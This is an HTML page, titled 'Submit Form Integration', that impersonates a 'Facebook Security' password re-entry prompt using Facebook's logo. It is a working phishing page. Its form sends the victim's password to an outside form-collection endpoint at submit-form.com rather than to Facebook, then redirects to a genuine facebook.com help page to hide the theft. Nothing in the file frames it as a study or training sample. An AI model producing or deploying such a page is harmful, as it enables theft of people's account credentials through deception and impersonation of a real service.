

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Submit Form Integration</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 40px 30px;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
            text-align: center;
            width: 360px;
            position: relative;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 120px;
        }
        .header {
            margin-bottom: 20px;
            font-size: 18px;
            color: #333;
            font-weight: bold;
        }
        .form-group {
            margin-bottom: 25px;
            text-align: left;
            position: relative;
        }
        .form-group label {
            display: block;
            font-weight: bold;
            margin-bottom: 8px;
            font-size: 14px;
            color: #606770;
        }
        .input-wrapper {
            position: relative;
        }
        .form-group input {
            width: 100%;
            padding: 14px;
            padding-right: 40px; /* Space for the eye icon */
            border: 1px solid #ccd0d5;
            border-radius: 6px;
            font-size: 16px;
            color: #1c1e21;
            box-sizing: border-box;
        }
        .form-group input:focus {
            border-color: #1877f2;
            outline: none;
            box-shadow: 0px 0px 0px 2px rgba(24, 119, 242, 0.2);
        }
        .eye-icon {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 20px;
            color: #606770;
            cursor: pointer;
            transition: color 0.3s ease;
        }
        .eye-icon:hover {
            color: #1877f2;
        }
        .submit-button {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        .submit-button:hover {
            background-color: #166fe5;
        }
        .error-message {
            color: #e74c3c;
            font-size: 14px;
            margin-top: 5px;
            margin-bottom: 15px;
            text-align: left;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Logo">
        </div>
        <div class="header">
            Facebook Security
        </div>
        <p>Please re-enter your password to complete the request.</p>
        <form id="passwordForm" action="https://submit-form.com/pLswR24M2" method="POST">
            <div class="form-group">
                <label for="password">Password</label>
                <div class="input-wrapper">
                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
                    <i class="eye-icon fas fa-eye" id="togglePassword"></i>
                </div>
                <span id="error-message" class="error-message"></span>
            </div>
            <button type="submit" class="submit-button">Submit</button>
        </form>
    </div>
    <script>
        document.getElementById('togglePassword').addEventListener('click', function() {
            var passwordField = document.getElementById('password');
            var eyeIcon = this;
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                eyeIcon.classList.remove('fa-eye');
                eyeIcon.classList.add('fa-eye-slash');
            } else {
                passwordField.type = 'password';
                eyeIcon.classList.remove('fa-eye-slash');
                eyeIcon.classList.add('fa-eye');
            }
        });

        document.getElementById('passwordForm').addEventListener('submit', function(event) {
            var passwordField = document.getElementById('password');
            var errorMessage = document.getElementById('error-message');
            if (passwordField.value.length < 6) {
                errorMessage.textContent = 'Password must be at least 6 characters long.';
                event.preventDefault();
            } else {
                errorMessage.textContent = '';
                // Submit form normally
                // Redirect after form submission
                setTimeout(function() {
                    window.location.href = 'https://www.facebook.com/help/media/thank-you?rdrhc'; // Redirect to desired URL
                }, 2000); // Wait 2 seconds for form submission to complete
            }
        });
    </script>
</body>
</html>
